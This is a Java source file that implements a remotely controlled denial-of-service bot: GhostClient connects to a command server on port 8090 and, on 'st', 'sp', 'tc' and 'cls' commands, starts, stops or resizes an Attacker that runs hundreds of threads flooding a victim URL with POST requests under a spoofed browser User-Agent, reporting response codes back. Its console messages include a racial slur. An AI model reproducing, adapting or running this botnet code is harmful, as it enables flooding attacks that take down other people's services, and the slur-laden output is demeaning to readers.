package game.actions;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class GhostClient  extends Thread {
	public HashMap< Integer, Integer> responseMap = new HashMap< Integer, Integer>();
	public Attacker attacker ;
	public PrintStream writer;
	public String HOST ="127.0.0.1"; 
	public Socket soket;
	
	public BufferedReader readd ; 
	public BufferedWriter bufferedWriter ;
	private BufferedReader bufferedReader;
	
	boolean once =true;
	
	
	public synchronized void setResult(Integer code  , int val  ) {
		if(val==0) {
			responseMap.put(code, 0);
			return;
		}
		Integer res = responseMap.get(code);
    	responseMap.put(code ,   res != null ? res +=1:1);
	}
	
	// This class holds a thread for sending the status code results to the server 
    // in each 3 seconds
    public void notifyResult() {
    	ScheduledExecutorService service = Executors.newScheduledThreadPool(10);
        service.scheduleAtFixedRate( ()->{
        	try {
        	Iterator iterator = responseMap.entrySet().iterator();
        	while(iterator.hasNext()) {
        		Map.Entry mapElement = (Map.Entry)iterator.next();
            	sendMessage( (Integer)mapElement.getKey() ,  (Integer)mapElement.getValue());
            	responseMap.put((Integer)mapElement.getKey() , 0);
        	}
        	}catch(Exception e) {
        		System.out.println(e.getMessage());
        	}
        }, 0, 3000, TimeUnit.MILLISECONDS);
    }
    
    // sendMessage ... 
	public void sendMessage(Integer code  , Integer result ) {
		try {
			if(writer != null  && soket != null) {
				writer =  new PrintStream(soket.getOutputStream());
			}
			String structuredMessage = "sd;"+code+  ";"+ result+"\n";
			writer.println(structuredMessage);
			writer.flush();
			System.out.println("Sending the message .. ");
		}catch(Exception e) {	
			System.out.println(e.getMessage());
		}
	}
		
	@Override
	public void run() {
//		notifyResult();
		boolean hostNotValid = false;
		
		while(soket == null || !soket.isConnected()) {
			try {
				soket = new Socket(HOST,8090);
				
				if(soket.isConnected()) {
					System.out.println("I Got Connected nigga ");
				}				
				while( soket.isConnected()) {

					if( this.bufferedReader == null ) {
						try {
							this.bufferedReader = new BufferedReader( new InputStreamReader(soket.getInputStream()));
							// this.bufferedWriter = this.bufferedWriter == null ? new BufferedWriter( new OutputStreamWriter(socket.getOutputStream())) : this.bufferedWriter;
						}catch(Exception e ) {	
						}
					}
					if( soket != null) {
						try {
							writer =  new PrintStream(soket.getOutputStream());
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
					String message ;
					try {
						message = bufferedReader.readLine();
						if(message != null ){
							System.out.println("New Message : "   + message );
						try {
							String[] formats = message.split(";");
							// System.out.println("Message Arrived nigga ");
							System.out.println(" Message : " + message );
							if( formats[0].equals("st") ) {
								try{
									if(this.attacker != null || this.attacker.isAlive()) {
										this.attacker.stopAttack();
										this.attacker.stop();
										this.attacker= null ;
									}
								}catch(Exception e ) {
									
								}
								this.attacker = new Attacker(this  , (formats[1])  , Integer.parseInt(formats[2]) , (formats[3]) , Integer.parseInt(formats[4]));
								this.attacker.start();
							}else if ( formats[0].equals("sp") ) {
								if(attacker != null) {
									this.attacker.stopAttack();
								}
							}else if( formats[0].equals("tc") ) {
								Integer value = Integer.parseInt(formats[1]);
								this.attacker.setThreadsCount(value);
							}else if(formats[0].equals("cls")) {
								try {
									this.stop();
								}catch(Exception e) {}
							}
						}catch(Exception e ) {	
							e.printStackTrace();
						}
					}
					}catch(Exception e ) {
					}
				}
			} catch (Exception e) {
//				System.out.println("Ooops");
			} 
		}
	}
}

// Attacker class representing the attacking client thread 
class Attacker extends Thread { 
		
	// dosThreads holding a list of threads 
	public ArrayList<DDosThread>  dosThreads = new ArrayList<DDosThread>();
	
	public String[] responses= new String[40];
	
	public static HashMap< Integer, Integer>  responseMap = new HashMap< Integer, Integer>();
	
	public String host; 
	
	public static String victimAddress= "http://10.9.211.98:8080/distr.png";
	
 
	// public static Scanner scanner = new Scanner(System.in);
	// GhostClient is a client instance to be used for notifying information found by the thread
	public GhostClient client ;
	// threadsCount this variable will be used to set the number of threads attackers to use while attacking ;
	public int threadsCount=500;
	
	public Attacker(GhostClient client , String victimAddress  , int victimePort , String victimeRoute   , int threadsCount ) {
    	this.victimAddress= "http://"+victimAddress +":"+victimePort+victimeRoute;
    	this.client = client; 
    	this.threadsCount = threadsCount;
    }
	
	public void destroyThreads() {
		for(int a =0;a < this.dosThreads.size(); a++) {
			this.dosThreads.get(a).stop();
			this.dosThreads.get(a).destroy();
			this.dosThreads.set(a, null);
		}
	}
	
	public void stopAttack() {
		for (int a =0; a < this.dosThreads.size(); a++) {
			this.dosThreads.get(a).running.set(false);
			this.dosThreads.get(a).stop();
			return; 
		}
	}
	
	
	public void notifyResult() {
    	ScheduledExecutorService service = Executors.newScheduledThreadPool(10);
        service.scheduleAtFixedRate( ()->{
        	System.out.println(dosThreads.size());
        }, 0, 3000, TimeUnit.MILLISECONDS);
    }
	
	// setThreadsCount ...  
	@SuppressWarnings("deprecation")
	public void setThreadsCount(int threadsCount ) {
		System.out.println("Sent Threads Count to : "   + threadsCount );
		if(threadsCount < this.threadsCount) {
			for (int a =0; a < threadsCount ; a++ ) {
				if (a+1 >threadsCount) {
					this.dosThreads.get(a).running.set(false);
					this.dosThreads.get(a).stop();
					this.dosThreads.remove(a);
				}
			}
		}else if (threadsCount > this.threadsCount){
			for(int b= this.threadsCount; b< threadsCount ; b++) {
				// Creating a DOS thread instance which in turn to be used as an attacking client.
	        	DDosThread thread;
				try {
					thread = new DDosThread(client);
					this.dosThreads.add(thread);
					thread.start();
				}catch (Exception e) {
					System.out.println(e.getMessage());
					continue;
				}
			}
		}
		this.threadsCount= threadsCount;
		System.out.println(" After Setting the Threads COunt : "  + dosThreads.size());
	}
	
	int count = 0;
	
	@Override 
    public void run(){
		notifyResult() ;
		if(this.threadsCount < dosThreads.size() ) {
			int nval =count ; 
			for (;nval>threadsCount ;nval--) {
				dosThreads.get(nval).stop();
				dosThreads.set(nval , null );
			}
			return ;
		}
		System.out.println("Creating the attack ");
        for (;count < threadsCount; count++) {
        	// Creating a DOS thread instance which in turn to be used as an attacking client.
        	DDosThread thread;
			try {
				thread = new DDosThread(client);
				this.dosThreads.add(thread);
				thread.start();
			}catch (Exception e) {
				System.out.println(e.getMessage());
				continue;
			}
            
        }
    }
    
    public static class DDosThread extends Thread {
    	public GhostClient client;
        public AtomicBoolean running;
        private String request = victimAddress;
        private URL url;
        
        String param = null;
        public DDosThread(GhostClient client ) throws Exception {
        	this.client = client;
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("999999", "UTF-8");
        }
        
        
        public void changeRoute( String req ) throws Exception {
        	this.url = new URL(req);
        }
        
        
        @Override
        public void run() { 
        	running= new AtomicBoolean(true);
            while (running.get()) {
            	attack();
            }
        }
        
        // attack() -- 
        public void attack(){
        	try {
	            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
	            connection.setDoOutput(true);
	            connection.setDoInput(true);
	            connection.setRequestMethod("POST");
	            connection.setRequestProperty("charset", "utf-8");
	            connection.setRequestProperty("Host", "localhost");
	            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
	            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	            connection.setRequestProperty("Content-Length", param);
	            Integer resCode = connection.getResponseCode() ;
	            if (resCode  >= 100) {
	            	System.out.println("Status Code " + resCode);
	            	client.setResult(resCode , 1);
	            	return;
	            }
	            connection.getInputStream();
        	}catch(Exception e ) {
        		if(e==null ) {
        			return;
        		}
            	if( e != null && e.getMessage() != null  && e.getMessage().equals("Connection refused (Connection refused)")) {
            		try {
						this.sleep(1000);
					} catch (InterruptedException e1) {
					}
            	}
        	}
        }   
    }
}